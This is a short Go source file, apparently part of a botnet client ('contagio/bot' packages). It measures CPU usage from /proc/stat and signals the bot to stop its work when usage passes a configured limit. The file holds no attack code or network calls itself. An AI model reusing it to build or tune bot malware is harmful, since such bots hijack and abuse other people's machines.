package main

import (
	"contagio/bot/config"
	"contagio/bot/methods"
	"contagio/bot/utils"
	"fmt"
	"os"
	"runtime"
	"strconv"
	"strings"
	"time"
)

func GetCPUUsage() (idle, total uint64) {
	defer methods.Catch()

	contents, err := os.ReadFile("/proc/stat")
	if err != nil {
		return
	}
	lines := strings.Split(string(contents), "\n")
	for _, line := range lines {
		fields := strings.Fields(line)
		if fields[0] == "cpu" {
			numFields := len(fields)
			for i := 1; i < numFields; i++ {
				val, err := strconv.ParseUint(fields[i], 10, 64)
				if err != nil {
					if config.DEBUG {
						fmt.Println("Cpu error: ", i, fields[i], err)
					}
					return
				}
				total += val
				if i == 4 {
					idle = val
				}
			}
			return
		}
	}
	return

}

func CpuMonitor() {
	defer methods.Catch()

	go func() {
		defer methods.Catch()

		if runtime.NumCPU() == 0 {
			return
		}

		for {
			idle0, total0 := GetCPUUsage()
			time.Sleep(3 * time.Second)
			idle1, total1 := GetCPUUsage()

			idleTicks := float64(idle1 - idle0)
			totalTicks := float64(total1 - total0)
			cpuUsage := 100 * (totalTicks - idleTicks) / totalTicks

			if int(cpuUsage) < 0 {
				continue
			}

			if int(cpuUsage) >= config.MAX_CPU_VALUE {
				go func() {
					utils.StopChan <- true
				}()
				continue
			}
		}
	}()

}
